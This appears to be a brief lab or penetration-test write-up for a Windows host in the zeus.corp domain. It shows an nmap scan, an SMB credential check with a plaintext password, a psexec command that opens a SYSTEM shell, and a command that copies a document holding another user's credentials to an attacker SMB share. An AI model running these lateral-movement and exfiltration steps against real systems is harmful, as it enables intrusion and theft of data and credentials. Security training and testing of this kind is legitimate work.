# CLIENT02 .160 \[W]

Domain Users



## Enumeration

```
Nmap scan report for 192.168.178.160
Host is up (0.046s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
7680/tcp  open  tcpwrapped
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```



### Ports

Port specific enumeration&#x20;

### Local Users

## Initial Foothold

```
nxc smb 192.168.209.160 -u o.foller -p 'EarlyMorningFootball777'
SMB         192.168.209.160 445    CLIENT02         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT02) (domain:zeus.corp) (signing:False) (SMBv1:False) 
SMB         192.168.209.160 445    CLIENT02         [+] zeus.corp\o.foller:EarlyMorningFootball777 (Pwn3d!)
```

```
python3 psexec.py zeus.corp/o.foller:EarlyMorningFootball777@192.168.209.160 cmd.exe
```

## PrivEsc

We logged in as SYSTEM lad

## Post Exploitation

Find a word document in Documents exposing creds of 'z.thomas' in plaintext.

```
copy "Onboarding Document.docx" "\\192.168.45.180\share"
```
